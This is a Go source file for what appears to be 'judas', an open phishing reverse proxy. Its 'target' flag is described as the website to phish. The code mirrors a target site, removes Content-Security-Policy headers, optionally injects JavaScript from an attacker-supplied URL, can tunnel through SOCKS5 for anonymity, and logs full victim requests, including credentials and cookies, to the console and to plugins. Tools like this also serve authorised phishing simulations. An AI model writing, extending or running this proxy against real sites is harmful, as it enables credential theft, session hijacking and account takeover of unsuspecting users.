package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	_ "net/http/pprof"
	"net/url"
	"os"
	"path/filepath"
	"time"

	"github.com/joncooperworks/judas/plugins"
	"golang.org/x/net/proxy"
)

const (
	// DefaultTimeout is the HTTP client timeout.
	DefaultTimeout = 20 * time.Second
)

var (
	targetURL      = flag.String("target", "", "The website we want to phish.")
	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
	proxyAddress   = flag.String("proxy", "", "Optional upstream SOCKS5 proxy. Useful for torification.")
	javascriptURL  = flag.String("inject-js", "", "URL to a JavaScript file you want injected.")
	insecure       = flag.Bool("insecure", false, "Listen without TLS.")
	sourceInsecure = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
	certPath       = flag.String("cert", "", "Path to the x509 encoded SSL certificate in PEM format.")
	privateKeyPath = flag.String("private-key", "", "Path to the x509 encoded certificate in PEM format.")
)

func newTLSListener(address, certPath, privateKeyPath string) (net.Listener, error) {
	cer, err := tls.LoadX509KeyPair(certPath, privateKeyPath)
	if err != nil {
		return nil, err
	}

	config := &tls.Config{Certificates: []tls.Certificate{cer}}
	return tls.Listen("tcp", address, config)
}

func newInsecureListener(address string) (net.Listener, error) {
	return net.Listen("tcp", address)
}

func exitWithError(message string) {
	log.Println(message)
	os.Exit(-1)
}

func setupRequiredFlags() {
	flag.Parse()
	if *address == "" {
		exitWithError("--address is required.")
	}

	if *targetURL == "" {
		exitWithError("--target is required.")
	}

	if !*insecure {
		if *privateKeyPath == "" || *certPath == "" {
			exitWithError("--private-key and --cert arguments must point to x509 encoded PEM private key and certificate, or call with the --insecure flag.")
		}
	}
}

func loadPluginsFromDirectory(pluginsDirectory string) (map[plugins.Plugin]plugins.PluginArguments, error) {
	pluginFilePaths, err := filepath.Glob(pluginsDirectory)
	if err != nil {
		return nil, err
	}

	installedPlugins := map[plugins.Plugin]plugins.PluginArguments{}
	for _, filepath := range pluginFilePaths {
		plugin, err := plugins.New(filepath)
		if err != nil {
			return nil, err
		}

		arguments, err := plugin.Initialize()
		if err != nil {
			return nil, err
		}
		installedPlugins[plugin] = arguments
	}
	return installedPlugins, nil
}

func main() {
	installedPlugins, err := loadPluginsFromDirectory("*.so")
	if err != nil {
		exitWithError(err.Error())
	}
	setupRequiredFlags()
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		exitWithError(err.Error())
	}

	client := &http.Client{
		Timeout: DefaultTimeout,
	}

	if *proxyAddress != "" {
		dialer, err := proxy.SOCKS5("tcp", *proxyAddress, nil, proxy.Direct)
		if err != nil {
			exitWithError(err.Error())
		}
		httpTransport := &http.Transport{}
		httpTransport.Dial = dialer.Dial
		client.Transport = httpTransport
	}

	responseTransformers := []ResponseTransformer{
		LocationRewritingResponseTransformer{},
		CSPRemovingTransformer{},
	}

	if *javascriptURL != "" {
		responseTransformers = append(responseTransformers, JavaScriptInjectionTransformer{javascriptURL: *javascriptURL})
	}

	phishingProxy := &PhishingProxy{
		client:               client,
		targetURL:            u,
		responseTransformers: responseTransformers,
	}

	if *attachProfiler {
		go func() {
			log.Println("Starting profiler.")
			log.Println(http.ListenAndServe("localhost:6060", nil))
		}()
	}

	var server net.Listener
	if *insecure {
		server, err = newInsecureListener(*address)
	} else {
		server, err = newTLSListener(*address, *certPath, *privateKeyPath)
	}
	if err != nil {
		exitWithError(err.Error())
	}
	var listenAddr string
	if *insecure {
		listenAddr = fmt.Sprintf("http://%s", *address)
	} else {
		listenAddr = fmt.Sprintf("https://%s", *address)
	}
	log.Println("Listening on:", listenAddr)
	transactions := make(chan plugins.HTTPTransaction)

	// Process all the plugin arguments.
	for plugin, arguments := range installedPlugins {
		go plugin.ProcessTransactions(transactions, arguments)
	}

	// Log transactions to console
	go logTransactions(transactions)

	for {
		conn, err := server.Accept()
		if err != nil {
			log.Println("Error when accepting request,", err.Error())
			continue
		}
		go phishingProxy.HandleConnection(conn, transactions)
	}
}

func logTransactions(transactions <-chan plugins.HTTPTransaction) {
	for transaction := range transactions {
		request := transaction.Request
		req, err := httputil.DumpRequest(&request, true)
		if err != nil {
			log.Println("Error dumping request to console.")
			log.Println(err.Error())
			return
		}
		log.Println(string(req))

		resp, err := httputil.DumpResponse(&transaction.Response, false)
		if err != nil {
			log.Println("Error dumping response to console.")
			log.Println(err.Error())
			return
		}
		log.Println(string(resp))
	}
}
